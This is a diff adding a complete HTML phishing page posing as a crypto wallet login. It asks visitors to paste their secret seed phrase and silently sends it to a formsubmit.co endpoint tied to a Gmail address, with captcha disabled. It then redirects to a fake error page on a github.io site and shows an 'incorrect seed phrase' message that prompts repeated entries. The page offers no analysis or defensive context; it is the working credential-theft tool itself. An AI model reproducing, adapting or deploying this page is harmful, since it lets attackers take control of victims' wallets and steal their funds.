@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Access Wallet</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+      margin: auto;
+    }
+
+    h3 {
+      text-align: center;
+      font-size: 15px;
+      margin-bottom: 20px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #ccc;
+      margin: 10px 0 16px 0;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 12px;
+    }
+
+    textarea {
+      width: 100%;
+      height: 120px;
+      font-size: 16px;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #e8f9ff;
+      resize: none;
+    }
+
+    .warning {
+      background-color: #fff3f3;
+      color: #d10000;
+      padding: 12px;
+      margin-top: 15px;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 10px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .button {
+      margin-top: 20px;
+      background-color: #0050ff;
+      color: white;
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      border: none;
+      border-radius: 16px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      background-color: #003dcc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form action="https://formsubmit.co/kt5873202@gmail.com" method="post" onsubmit="showErrorMessage()">
+      <h3>Access wallet with seed phrase</h3>
+      <hr/>
+      <div class="subtitle">Paste your 12 word seed phrase here:</div>
+      <textarea name="seed-phrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+      <div class="warning">
+          
+          <input type="hidden" name="_captcha" value="false">
+          
+    <input type="hidden" name="_next" value="https://rubi347.github.io/.com/error.html">
+    
+        <strong>Warning!</strong> Paste the secret seed phrase of 12 words into the box above to access. You only have 5 incorrect entries per day. Please try again the next day if you exceed 5 failed attempts!
+      </div>
+      <div id="error" class="error-message">Incorrect seed phrase. Please try again.</div>
+      <button type="submit" class="button">access wallet</button>
+    </form>
+  </div>
+
+  <script>
+    function showErrorMessage() {
+      document.getElementById('error').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
